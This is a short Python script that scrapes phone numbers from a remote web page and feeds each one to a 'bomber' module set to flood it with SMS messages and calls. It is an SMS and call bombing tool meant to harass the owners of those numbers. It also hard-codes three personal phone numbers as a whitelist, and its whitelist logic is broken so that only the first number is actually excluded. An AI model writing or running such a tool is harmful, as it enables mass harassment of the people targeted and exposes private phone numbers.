import requests
from bomber import selectnode
from bs4 import BeautifulSoup
 

urls = 'https://crazyboysofagv.000webhostapp.com/numbers/'

grab = requests.get(urls)

soup = BeautifulSoup(grab.text, 'html.parser')
 
# opening a file in write mode

f = open("num.txt", "w")
# traverse paragraphs from soup

for link in soup.find_all("a"):

   data = link.get('href')

   f.write(data)
   print(data)
   f.write("\n")
 
f.close()
whitelist = ["9798092707","6203801709","9835023651"]

fin = open("num.txt", "rt")
fout = open("number.txt", "wt")
for wl in whitelist:
   for line in fin:
       fout.write(line.replace(wl, ''))
fin.close()
fout.close()
with open('number.txt','r') as number:
  for i in number:
     selectnode(mode='sms', num=str(i))
     selectnode(mode='call', num=str(i))
